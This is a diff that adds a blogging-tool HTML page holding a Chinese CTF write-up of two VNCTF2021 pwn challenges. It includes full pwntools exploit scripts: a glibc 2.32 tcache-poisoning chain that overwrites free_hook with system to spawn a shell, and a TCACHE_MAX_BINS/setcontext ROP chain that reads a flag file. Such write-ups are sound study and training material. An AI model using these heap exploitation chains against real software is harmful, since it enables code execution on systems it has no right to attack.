@@ -1,0 +1,318 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>VNCTF2021 Pwn | N0k's Den</title><meta name=keywords content="write-up,heap,ctf,pwn"><meta name=description content="一点废话
+2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了&mldr;
+过了一个月,回头看下比赛中的pwn题.
+ff
+glibc 2.32, 需要疯狂调试的一道题,令人昏迷.
+程序分析
+漏洞
+free 后指针未清空.
+坑点
+
+没用数组存储指针, 只能控制上一个malloc()的chunk
+能malloc()的最大大小为0x7F (之后会发现这点把最后利用时使用的size卡的很死)
+show() 只能用一次, 应该是要打stdout了
+edit() 只能用两次&mldr;
+2.32中, tcache_entry 中的next指针会被PROTECT_PTR函数异或处理, 使用的mask为其地址&#187;12.
+
+思路
+
+利用PROTECT_PTR:  利用next值为0的chunk, 和
+
+mask ⊕ 0 = mask
+以上这个特性, show()泄露出 mask. mask存放着 堆地址 &#187; 12. show()次数用尽.
+
+
+通过UAF漏洞, edit()修改tcache_entry中的key值. tcache_entry使用用户chunk中的用户数据,key就在所谓bk指针的位置. 修改完key值,就可以绕过检查进行double free().
+
+
+通过edit()做tcache poisoning, 劫持到tcache_perthread_struct. 需注意tcache_entry->next 指向的是用户数据段, 因此需要劫持的地址需要加上0x10. 还需要用之前泄露出的mask对其做一次异或. edit()次数用尽.
+
+
+edit(p64(mask ^ (heap_base + 0x10))+p64(0))
+
+
+tcache_perthread_struct大小为0x290, 我们把counts[0x290]覆盖成大于等于7,就能将其释放到unsortedbin中.
+
+
+非常重要的一点: 记得我们在tcache_perthread_struct操作, 该chunk进入unsortedbin中会对counts[]进行污染,我们要将其清零. 同时,我们也应当为之后的利用entries[]的操作做准备,设置对应的counts[]值使其大于零.
+
+
+利用unsortedbin中chunk的分割,将main_arena地址写到entries[目标大小]中. 通过partial overwrite 打到_IO_2_1_stdout_ (需要爆破,1 / 2^4)."><meta name=author content="N0k"><link rel=canonical href=http://localhost:1313/posts/vnctf2021/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/vnctf2021/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/vnctf2021/"><meta property="og:site_name" content="N0k's Den"><meta property="og:title" content="VNCTF2021 Pwn"><meta property="og:description" content="一点废话 2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了… 过了一个月,回头看下比赛中的pwn题.
+ff glibc 2.32, 需要疯狂调试的一道题,令人昏迷.
+程序分析 漏洞 free 后指针未清空.
+坑点 没用数组存储指针, 只能控制上一个malloc()的chunk 能malloc()的最大大小为0x7F (之后会发现这点把最后利用时使用的size卡的很死) show() 只能用一次, 应该是要打stdout了 edit() 只能用两次… 2.32中, tcache_entry 中的next指针会被PROTECT_PTR函数异或处理, 使用的mask为其地址»12. 思路 利用PROTECT_PTR: 利用next值为0的chunk, 和 mask ⊕ 0 = mask 以上这个特性, show()泄露出 mask. mask存放着 堆地址 » 12. show()次数用尽.
+通过UAF漏洞, edit()修改tcache_entry中的key值. tcache_entry使用用户chunk中的用户数据,key就在所谓bk指针的位置. 修改完key值,就可以绕过检查进行double free().
+通过edit()做tcache poisoning, 劫持到tcache_perthread_struct. 需注意tcache_entry->next 指向的是用户数据段, 因此需要劫持的地址需要加上0x10. 还需要用之前泄露出的mask对其做一次异或. edit()次数用尽.
+edit(p64(mask ^ (heap_base + 0x10))+p64(0)) tcache_perthread_struct大小为0x290, 我们把counts[0x290]覆盖成大于等于7,就能将其释放到unsortedbin中.
+非常重要的一点: 记得我们在tcache_perthread_struct操作, 该chunk进入unsortedbin中会对counts[]进行污染,我们要将其清零. 同时,我们也应当为之后的利用entries[]的操作做准备,设置对应的counts[]值使其大于零.
+利用unsortedbin中chunk的分割,将main_arena地址写到entries[目标大小]中. 通过partial overwrite 打到_IO_2_1_stdout_ (需要爆破,1 / 2^4)."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-04-08T16:48:49+00:00"><meta property="article:modified_time" content="2021-04-08T16:48:49+00:00"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Heap"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Pwn"><meta name=twitter:card content="summary"><meta name=twitter:title content="VNCTF2021 Pwn"><meta name=twitter:description content="一点废话
+2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了&mldr;
+过了一个月,回头看下比赛中的pwn题.
+ff
+glibc 2.32, 需要疯狂调试的一道题,令人昏迷.
+程序分析
+漏洞
+free 后指针未清空.
+坑点
+
+没用数组存储指针, 只能控制上一个malloc()的chunk
+能malloc()的最大大小为0x7F (之后会发现这点把最后利用时使用的size卡的很死)
+show() 只能用一次, 应该是要打stdout了
+edit() 只能用两次&mldr;
+2.32中, tcache_entry 中的next指针会被PROTECT_PTR函数异或处理, 使用的mask为其地址&#187;12.
+
+思路
+
+利用PROTECT_PTR:  利用next值为0的chunk, 和
+
+mask ⊕ 0 = mask
+以上这个特性, show()泄露出 mask. mask存放着 堆地址 &#187; 12. show()次数用尽.
+
+
+通过UAF漏洞, edit()修改tcache_entry中的key值. tcache_entry使用用户chunk中的用户数据,key就在所谓bk指针的位置. 修改完key值,就可以绕过检查进行double free().
+
+
+通过edit()做tcache poisoning, 劫持到tcache_perthread_struct. 需注意tcache_entry->next 指向的是用户数据段, 因此需要劫持的地址需要加上0x10. 还需要用之前泄露出的mask对其做一次异或. edit()次数用尽.
+
+
+edit(p64(mask ^ (heap_base + 0x10))+p64(0))
+
+
+tcache_perthread_struct大小为0x290, 我们把counts[0x290]覆盖成大于等于7,就能将其释放到unsortedbin中.
+
+
+非常重要的一点: 记得我们在tcache_perthread_struct操作, 该chunk进入unsortedbin中会对counts[]进行污染,我们要将其清零. 同时,我们也应当为之后的利用entries[]的操作做准备,设置对应的counts[]值使其大于零.
+
+
+利用unsortedbin中chunk的分割,将main_arena地址写到entries[目标大小]中. 通过partial overwrite 打到_IO_2_1_stdout_ (需要爆破,1 / 2^4)."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"VNCTF2021 Pwn","item":"http://localhost:1313/posts/vnctf2021/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"VNCTF2021 Pwn","name":"VNCTF2021 Pwn","description":"一点废话 2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了\u0026hellip; 过了一个月,回头看下比赛中的pwn题.\nff glibc 2.32, 需要疯狂调试的一道题,令人昏迷.\n程序分析 漏洞 free 后指针未清空.\n坑点 没用数组存储指针, 只能控制上一个malloc()的chunk 能malloc()的最大大小为0x7F (之后会发现这点把最后利用时使用的size卡的很死) show() 只能用一次, 应该是要打stdout了 edit() 只能用两次\u0026hellip; 2.32中, tcache_entry 中的next指针会被PROTECT_PTR函数异或处理, 使用的mask为其地址\u0026raquo;12. 思路 利用PROTECT_PTR: 利用next值为0的chunk, 和 mask ⊕ 0 = mask 以上这个特性, show()泄露出 mask. mask存放着 堆地址 \u0026raquo; 12. show()次数用尽.\n通过UAF漏洞, edit()修改tcache_entry中的key值. tcache_entry使用用户chunk中的用户数据,key就在所谓bk指针的位置. 修改完key值,就可以绕过检查进行double free().\n通过edit()做tcache poisoning, 劫持到tcache_perthread_struct. 需注意tcache_entry-\u0026gt;next 指向的是用户数据段, 因此需要劫持的地址需要加上0x10. 还需要用之前泄露出的mask对其做一次异或. edit()次数用尽.\nedit(p64(mask ^ (heap_base + 0x10))+p64(0)) tcache_perthread_struct大小为0x290, 我们把counts[0x290]覆盖成大于等于7,就能将其释放到unsortedbin中.\n非常重要的一点: 记得我们在tcache_perthread_struct操作, 该chunk进入unsortedbin中会对counts[]进行污染,我们要将其清零. 同时,我们也应当为之后的利用entries[]的操作做准备,设置对应的counts[]值使其大于零.\n利用unsortedbin中chunk的分割,将main_arena地址写到entries[目标大小]中. 通过partial overwrite 打到_IO_2_1_stdout_ (需要爆破,1 / 2^4).\n","keywords":["write-up","heap","ctf","pwn"],"articleBody":"一点废话 2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了… 过了一个月,回头看下比赛中的pwn题.\nff glibc 2.32, 需要疯狂调试的一道题,令人昏迷.\n程序分析 漏洞 free 后指针未清空.\n坑点 没用数组存储指针, 只能控制上一个malloc()的chunk 能malloc()的最大大小为0x7F (之后会发现这点把最后利用时使用的size卡的很死) show() 只能用一次, 应该是要打stdout了 edit() 只能用两次… 2.32中, tcache_entry 中的next指针会被PROTECT_PTR函数异或处理, 使用的mask为其地址»12. 思路 利用PROTECT_PTR: 利用next值为0的chunk, 和 mask ⊕ 0 = mask 以上这个特性, show()泄露出 mask. mask存放着 堆地址 » 12. show()次数用尽.\n通过UAF漏洞, edit()修改tcache_entry中的key值. tcache_entry使用用户chunk中的用户数据,key就在所谓bk指针的位置. 修改完key值,就可以绕过检查进行double free().\n通过edit()做tcache poisoning, 劫持到tcache_perthread_struct. 需注意tcache_entry-\u003enext 指向的是用户数据段, 因此需要劫持的地址需要加上0x10. 还需要用之前泄露出的mask对其做一次异或. edit()次数用尽.\nedit(p64(mask ^ (heap_base + 0x10))+p64(0)) tcache_perthread_struct大小为0x290, 我们把counts[0x290]覆盖成大于等于7,就能将其释放到unsortedbin中.\n非常重要的一点: 记得我们在tcache_perthread_struct操作, 该chunk进入unsortedbin中会对counts[]进行污染,我们要将其清零. 同时,我们也应当为之后的利用entries[]的操作做准备,设置对应的counts[]值使其大于零.\n利用unsortedbin中chunk的分割,将main_arena地址写到entries[目标大小]中. 通过partial overwrite 打到_IO_2_1_stdout_ (需要爆破,1 / 2^4).\n此处 payload = p64(0xfbad1800)+p64(0)*3+\"\\x00\" 写入payload,泄露出libc\n再次分割,覆盖entries[目标大小]为free_hook-0x10.(2.32中tcache申请的地址需要0x10对齐). 因为申请的大小最高为0x7f,这个目标大小不能超过0x90. 这对之前分割时使用的size限制比较死,需要好好调试一下.\n写入\"/bin/bash\", 改free_hook为system, 调用free触发system(\"/bin/bash\").\n总结 2.32 下新的防护机制也带来了新的泄露方式,学到了. 但出题能别把每个方面都限制的那么死么=.=, 调试起来真的痛苦.\n完整exp from pwn import *\rimport sys\rdef init():\rglobal target\rif len(sys.argv) \u003e1 and sys.argv[1] == 'r':\rtarget = remote(\"node3.buuoj.cn\",PORT)\relse:\rtarget=process([\"./ld-2.32.so\",\"./pwn\"],env={\"LD_PRELOAD\":\"/home/trident/libc/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc.so.6\"})\rif(len(sys.argv)\u003e1) and sys.argv[1]=='g':\rgdb.attach(target)\r#context.log_level='debug'\r#context.update(arch='')\r#gdb.attach(target)\rdef s(i):\rtarget.recvuntil(\"\u003e\u003e\")\rtarget.sendline(i)\rdef add(size,content):\rs(\"1\")\rtarget.recvuntil(\"ize:\")\rtarget.sendline(str(size))\rtarget.recvuntil(\"Content:\")\rtarget.send(content)\rdef delete():\rs(\"2\")\rdef show():\rs(\"3\")\rdef edit(content):\rs(\"5\")\rtarget.recvuntil(\"tent:\\n\")\rtarget.send(content)\rdef pwn():\radd(0x58,\"a\\n\")\rdelete()\rshow()\rmask = u64(target.recvuntil(\"1.add\",drop=True).ljust(8,'\\x00'))\r#success(\"mask leaked: \"+hex(mask))\rheap_base = mask \u003c\u003c 12\r#success(\"heap_base: \"+hex(heap_base))\r#double free\redit(p64(0xdeadbeef)*2) delete()\redit(p64(mask ^ (heap_base + 0x10))+p64(0))\radd(0x58,\"a\\n\")\r# hijack tcache_perthread_struct\r# overwrite tcache-\u003ecounts[0x290]\r# 0x27 * 2 = 0x4E\radd(0x58,\"\\x00\"*0x4E + p16(8)) delete()\r# now tcache_perthread_struct is in unsortedbin # let's split the chunk into our desired form\r# remember to carefully set up tcache-\u003ecount as we proceed\radd(0x48,p16(0)*3+p16(1)+p16(0)*2+p16(1)+p16(0))\radd(0x30,p64(0xdeadbeef)*2)\r#partial overwrite entry[0x50] to stdout\radd(0x18,p64(0)+\"\\xc0\\x96\")\r# fxxk stdout\radd(0x48,p64(0xfbad1800)+p64(0)*3+\"\\x00\") # operation after bruteforcing succeed\rdef pwn2(leak):\rlibc_base = leak - 0x1e4744\rsuccess(\"libc_base leaked: \"+hex(libc_base))\rfree_hook = libc_base + 0x1e6e40\rsystem = libc_base + 0x503c0\r# overwrite entry[0x80] to free_hook\radd(0x18,p64(free_hook-0x10)) # write system to free_hook\radd(0x78,\"/bin/bash\".ljust(16,\"\\x00\") + p64(system)) #BOOOOM!\rdelete()\rtarget.interactive()\rdef main():\rwhile True:\rtry:\rinit()\rpwn()\rleak = target.recvuntil('add')\rif \"\\x7f\" in leak:\rleak = u64(leak[1:7].ljust(8,\"\\x00\"))\rsuccess(\"stdout leak: \"+hex(leak))\rpwn2(leak)\relse:\rprint(\"FXXK!\")\rtarget.close()\rexcept:\rprint(\"FXXK!\")\rtarget.close()\rmain() LittleRedFlower TCACHE_MAX_BINS 利用, 学到东西了\n程序分析 白给libc地址, 白给一个一字节任意地址写.\n存在一个堆上的八字节任意写. 最后,可以申请一个大chunk并向其中写入数据.\n利用思路 获取白给的libc地址 通过一字节任意地址写更改TCACHE_MAX_BINS为大值; 这里可以动态调试确定偏移,通过 search -p tcache_perthread_struc的地址 libc 可以定位到_mp结构体,从而找到TCACHE_MAX_BINS的值. 可以看到,其中0x40即为TCACHE_MAX_BINS的默认值.这个值很好理解,0x410 = 0x40*0x10+0x10是tcache中可存放的最大的chunk. 此处为了方便,直接改写TCACHE_MAX_BINS+1的位置,使很大的chunk也能落入tcache当中.\n通过程序提供的堆溢出,将__free_hook写到entries[idx],并获取__free_hook. 这里需要满足counts[idx]\u003e= 1, 而程序也贴心的准备好了这样一个chunk. (我就喜欢这种题) 在计算entries[idx]的偏移时要注意,尽管TCACHE_MAX_BINS被改动,entries的起始偏移却没有变,仍然是0x10+0x80 = 0x90的位置.\n计算偏移的方式如下, 用0x1710大小的chunk举例:\n(0x1710-0x20)/0x10 * 8 + 0x90 = 0xC08\r输入的偏移是基于那个程序一开始分配的chunk\r因此 输入偏移 = 0xC08 - 0x2A0 = 0x968 另外,还需要验证counts[0x1710]是否落在布满’\\x01’的chunk上,\n(0x1710-0x20)/0x10 * 2 + 0x10 = 0x2EE 命中!\n因此输入偏移0x968并写入__free_hook,再输入size0x1700,就能获得到__free_hook.\n通过setcontext进行SROP, 同时布置ORW的ROP链, 执行ROP链. 之前对2.29以上版本的setcontext不熟悉,发现需要控制rdx. 这里要用到一个魔法gadget.\n0x154b20:\tmov rdx,QWORD PTR [rdi+0x8]\r0x154b24:\tmov QWORD PTR [rsp],rax\r0x154b28:\tcall QWORD PTR [rdx+0x20] 我们可以通过rdi (此时即__free_hook的地址)控制rdx. 根据gadget,将参数(指向伪栈帧的指针)放在rdi+8的位置, 再把setcontext + 61 放在伪栈帧+0x20的位置.这个布置参考了大佬的文章,利用伪栈帧前面的垃圾空间来为gadget布局,非常巧妙 https://www.anquanke.com/post/id/235821#h3-6\n之后就是布置伪栈帧与ROP链.\n完整exp from pwn import *\rimport sys\rif len(sys.argv) \u003e1 and sys.argv[1] == 'r':\rtarget = remote(\"node3.buuoj.cn\",26222)\relse:\r# target = process(\"\")\rtarget=process([\"./ld-2.30.so\",\"./pwn\"],env={\"LD_PRELOAD\":\"./libc.so.6\"})\rif(len(sys.argv)\u003e1) and sys.argv[1]=='g':\rgdb.attach(target)\rcontext.log_level='debug'\rcontext.arch='amd64'\r#context.update(arch='')\r#gdb.attach(target)\rdef writeWhatWhere(where,what):\rtarget.recvuntil(\"anywhere\\n\")\rtarget.send(p64(where))\rtarget.recvuntil(\"what?\\n\")\rtarget.send(what)\rdef pwn():\rlibc = ELF(\"./libc.so.6\")\rtarget.recvuntil(\"GIFT: \") leak = int(target.recvline(),16)\rsuccess(\"leak stdout: \" + hex(leak))\rtcache_max_bin = leak - 0x13d0\rlibc_base = leak-0x1eb6a0\rfree_hook = libc_base + 0x1edb20\rsuccess(\"TCACHE_MAX_BINS: \"+hex(tcache_max_bin))\roffset = 0x968\rsize = 0x1700 #0x1710\rwriteWhatWhere(tcache_max_bin+1,\"\\xff\")\rtarget.recvuntil(\"Offset:\\n\")\rtarget.sendline(str(offset))\rtarget.recvuntil(\"Content:\\n\")\rtarget.send(p64(free_hook))\rtarget.recvuntil(\"ize:\\n\")\rtarget.sendline(str(size))\r# payload constructed here\rret = libc_base + 0x256b9\rpop_rdi = libc_base + 0x26bb2\rpop_rsi = libc_base + 0x2709C\rpop_rdx_r12 = libc_base + 0x11c3b1\rthe_gadget = libc_base + 0x154b20\rsetcontext = libc_base + libc.sym[\"setcontext\"]\rframe = SigreturnFrame()\rframe_addr = free_hook+0x10\rframe.rax = 0 frame.rsp = frame_addr + 0x108\rframe.rip = ret\rROP_chain = [\rpop_rdi,\rframe_addr + 0xF8,\rlibc_base + libc.sym[\"open\"],\rpop_rdi,\r3,\rpop_rsi,\rframe_addr+0x250,\rpop_rdx_r12,\r0x40,\r0,\rlibc_base + libc.sym[\"read\"],\rpop_rdi,\rframe_addr+0x250,\rlibc_base + libc.sym[\"puts\"]\r]\rframe_str = str(frame).ljust(0xf8,\"\\x00\")\rpayload = p64(the_gadget) + p64(frame_addr) + p64(0)*4 + p64(setcontext+61)\rpayload += frame_str[0x28:] + \"./flag\\x00\\x00\"+p64(0) + flat(ROP_chain)\rtarget.recvuntil(\"\u003e\u003e\")\rtarget.sendline(payload)\rtarget.interactive()\rtarget.interactive() 总结 这两道题都考察了对tcache_perthread_struct的直接攻击,也碰到了未接触过的知识点,好评! 那道VM题鸽了,实在不想看.\n参考 https://www.anquanke.com/post/id/235821\n","wordCount":"566","inLanguage":"en","datePublished":"2021-04-08T16:48:49Z","dateModified":"2021-04-08T16:48:49Z","author":{"@type":"Person","name":"N0k"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/vnctf2021/"},"publisher":{"@type":"Organization","name":"N0k's Den","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="HOME (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>HOME</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=http://localhost:1313/about/ title="about me"><span>about me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">VNCTF2021 Pwn</h1><div class=post-meta><span title='2021-04-08 16:48:49 +0000 UTC'>April 8, 2021</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;566 words&nbsp;·&nbsp;N0k</div></header><div class=post-content><h6 id=一点废话>一点废话<a hidden class=anchor aria-hidden=true href=#一点废话>#</a></h6><p>2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了&mldr;
+过了一个月,回头看下比赛中的pwn题.</p><h2 id=ff>ff<a hidden class=anchor aria-hidden=true href=#ff>#</a></h2><p>glibc 2.32, 需要疯狂调试的一道题,令人昏迷.</p><h3 id=程序分析>程序分析<a hidden class=anchor aria-hidden=true href=#程序分析>#</a></h3><h4 id=漏洞>漏洞<a hidden class=anchor aria-hidden=true href=#漏洞>#</a></h4><p><code>free</code> 后指针未清空.</p><h4 id=坑点>坑点<a hidden class=anchor aria-hidden=true href=#坑点>#</a></h4><ul><li>没用数组存储指针, 只能控制上一个<code>malloc()</code>的chunk</li><li>能<code>malloc()</code>的最大大小为0x7F (之后会发现这点把最后利用时使用的size卡的很死)</li><li><code>show()</code> 只能用一次, 应该是要打stdout了</li><li><code>edit()</code> 只能用两次&mldr;</li><li>2.32中, tcache_entry 中的next指针会被<code>PROTECT_PTR</code>函数异或处理, 使用的mask为其地址&#187;12.</li></ul><h3 id=思路>思路<a hidden class=anchor aria-hidden=true href=#思路>#</a></h3><ol><li>利用<code>PROTECT_PTR</code>: 利用next值为0的chunk, 和</li></ol><pre tabindex=0><code>mask ⊕ 0 = mask
+</code></pre><p>以上这个特性, <code>show()</code>泄露出 mask. mask存放着 堆地址 &#187; 12. <code>show()</code>次数用尽.</p><ol start=2><li><p>通过UAF漏洞, <code>edit()</code>修改<code>tcache_entry</code>中的key值. <code>tcache_entry</code>使用用户chunk中的用户数据,key就在所谓bk指针的位置. 修改完key值,就可以绕过检查进行<code>double free()</code>.</p></li><li><p>通过<code>edit()</code>做<code>tcache poisoning</code>, 劫持到<code>tcache_perthread_struct</code>. 需注意tcache_entry->next 指向的是用户数据段, 因此需要劫持的地址需要加上0x10. 还需要用之前泄露出的mask对其做一次异或. <code>edit()</code>次数用尽.</p></li></ol><pre tabindex=0><code>edit(p64(mask ^ (heap_base + 0x10))+p64(0))
+</code></pre><ol start=4><li><p><code>tcache_perthread_struct</code>大小为0x290, 我们把<code>counts[0x290]</code>覆盖成大于等于7,就能将其释放到<code>unsortedbin</code>中.</p></li><li><p>非常重要的一点: 记得我们在<code>tcache_perthread_struct</code>操作, 该chunk进入<code>unsortedbin</code>中会对<code>counts[]</code>进行污染,我们要将其清零. 同时,我们也应当为之后的利用<code>entries[]</code>的操作做准备,设置对应的<code>counts[]</code>值使其大于零.</p></li><li><p>利用<code>unsortedbin</code>中chunk的分割,将main_arena地址写到<code>entries[目标大小]</code>中. 通过partial overwrite 打到<code>_IO_2_1_stdout_</code> (需要爆破,1 / 2^4).</p></li></ol><pre tabindex=0><code>此处 payload  = p64(0xfbad1800)+p64(0)*3+&#34;\x00&#34;
+</code></pre><p>写入payload,泄露出libc</p><ol start=7><li><p>再次分割,覆盖<code>entries[目标大小]</code>为<code>free_hook</code>-0x10.(2.32中tcache申请的地址需要0x10对齐).
+因为申请的大小最高为0x7f,这个目标大小不能超过0x90. 这对之前分割时使用的size限制比较死,需要好好调试一下.</p></li><li><p>写入"/bin/bash", 改free_hook为system, 调用<code>free</code>触发system("/bin/bash").</p></li></ol><h3 id=总结>总结<a hidden class=anchor aria-hidden=true href=#总结>#</a></h3><p>2.32 下新的防护机制也带来了新的泄露方式,学到了.
+但出题能别把每个方面都限制的那么死么=.=, 调试起来真的痛苦.</p><h3 id=完整exp>完整exp<a hidden class=anchor aria-hidden=true href=#完整exp>#</a></h3><pre tabindex=0><code>from pwn import *
+import sys
+
+def init():
+    global target
+    if len(sys.argv) &gt;1 and sys.argv[1] == &#39;r&#39;:
+        target = remote(&#34;node3.buuoj.cn&#34;,PORT)
+    else:
+        target=process([&#34;./ld-2.32.so&#34;,&#34;./pwn&#34;],env={&#34;LD_PRELOAD&#34;:&#34;/home/trident/libc/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc.so.6&#34;})
+        if(len(sys.argv)&gt;1) and sys.argv[1]==&#39;g&#39;:
+            gdb.attach(target)
+
+#context.log_level=&#39;debug&#39;
+#context.update(arch=&#39;&#39;)
+#gdb.attach(target)
+
+
+def s(i):
+    target.recvuntil(&#34;&gt;&gt;&#34;)
+    target.sendline(i)
+
+
+def add(size,content):
+    s(&#34;1&#34;)
+    target.recvuntil(&#34;ize:&#34;)
+    target.sendline(str(size))
+    target.recvuntil(&#34;Content:&#34;)
+    target.send(content)
+
+def delete():
+    s(&#34;2&#34;)
+
+def show():
+    s(&#34;3&#34;)
+
+def edit(content):
+    s(&#34;5&#34;)
+    target.recvuntil(&#34;tent:\n&#34;)
+    target.send(content)
+
+
+
+def pwn():
+    add(0x58,&#34;a\n&#34;)
+    delete()
+    show()
+
+    mask = u64(target.recvuntil(&#34;1.add&#34;,drop=True).ljust(8,&#39;\x00&#39;))
+    #success(&#34;mask leaked: &#34;+hex(mask))
+    heap_base = mask &lt;&lt; 12
+    #success(&#34;heap_base: &#34;+hex(heap_base))
+    
+    #double free
+    edit(p64(0xdeadbeef)*2) 
+    delete()
+    
+    edit(p64(mask ^ (heap_base + 0x10))+p64(0))
+    add(0x58,&#34;a\n&#34;)
+    
+    # hijack tcache_perthread_struct
+    # overwrite tcache-&gt;counts[0x290]
+    # 0x27 * 2 = 0x4E
+    add(0x58,&#34;\x00&#34;*0x4E + p16(8)) 
+    delete()
+    
+    # now tcache_perthread_struct is in unsortedbin 
+    # let&#39;s split the chunk into our desired form
+    
+    # remember to carefully set up tcache-&gt;count as we proceed
+    add(0x48,p16(0)*3+p16(1)+p16(0)*2+p16(1)+p16(0))
+    add(0x30,p64(0xdeadbeef)*2)
+    #partial overwrite entry[0x50] to stdout
+    add(0x18,p64(0)+&#34;\xc0\x96&#34;)
+    # fxxk stdout
+    add(0x48,p64(0xfbad1800)+p64(0)*3+&#34;\x00&#34;) 
+
+# operation after bruteforcing succeed
+def pwn2(leak):
+    libc_base = leak - 0x1e4744
+    success(&#34;libc_base leaked: &#34;+hex(libc_base))
+    
+    free_hook = libc_base + 0x1e6e40
+    system = libc_base + 0x503c0
+    
+    # overwrite entry[0x80] to free_hook
+    add(0x18,p64(free_hook-0x10)) 
+   
+    # write system to free_hook
+    add(0x78,&#34;/bin/bash&#34;.ljust(16,&#34;\x00&#34;) + p64(system)) 
+    #BOOOOM!
+    delete()
+    
+    target.interactive()
+
+def main():
+    while True:
+        try:
+            init()
+            pwn()
+            leak = target.recvuntil(&#39;add&#39;)
+            if &#34;\x7f&#34; in leak:
+                leak = u64(leak[1:7].ljust(8,&#34;\x00&#34;))
+                success(&#34;stdout leak: &#34;+hex(leak))
+                pwn2(leak)
+            else:
+                print(&#34;FXXK!&#34;)
+                target.close()
+        except:
+            print(&#34;FXXK!&#34;)
+            target.close()
+main()
+</code></pre><hr><h2 id=littleredflower>LittleRedFlower<a hidden class=anchor aria-hidden=true href=#littleredflower>#</a></h2><p><code>TCACHE_MAX_BINS</code> 利用, 学到东西了</p><h3 id=程序分析-1>程序分析<a hidden class=anchor aria-hidden=true href=#程序分析-1>#</a></h3><p>白给libc地址, 白给一个一字节任意地址写.</p><p><img loading=lazy src=/posts/vnctf2021/00.png></p><p>存在一个堆上的八字节任意写.
+<img loading=lazy src=/posts/vnctf2021/01.png></p><p>最后,可以申请一个大chunk并向其中写入数据.</p><h3 id=利用思路>利用思路<a hidden class=anchor aria-hidden=true href=#利用思路>#</a></h3><ol start=0><li>获取白给的libc地址</li><li>通过一字节任意地址写更改<code>TCACHE_MAX_BINS</code>为大值; 这里可以动态调试确定偏移,通过</li></ol><pre tabindex=0><code>search -p tcache_perthread_struc的地址 libc
+</code></pre><p>可以定位到<code>_mp</code>结构体,从而找到<code>TCACHE_MAX_BINS</code>的值.
